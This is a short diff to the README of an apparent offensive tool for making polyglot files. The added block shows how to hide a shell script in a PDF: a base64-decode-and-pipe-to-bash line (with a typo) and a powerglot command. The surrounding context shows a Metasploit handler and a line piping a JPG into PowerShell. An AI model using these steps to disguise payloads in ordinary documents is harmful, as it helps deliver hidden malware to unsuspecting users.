@@ -39,6 +39,17 @@ msf > use exploit/multi/handler msf exploit(multi/handler) > set payload windows
 # pwsh cat-o.jpg or cat cat-o.jpg | pwsd
 ```
 
+```
+# Polyglot in PDF
+#base64 payload.sh (example linenum.sh)
+#Create script.sh
+echo "fasdfafdafdf=" | base64 .d | bash
+
+#python3 powerglot -o script.sh file.pdf file-1.pdf
+```
+
+
+
 # Future work. Doing
 
 # Author & license
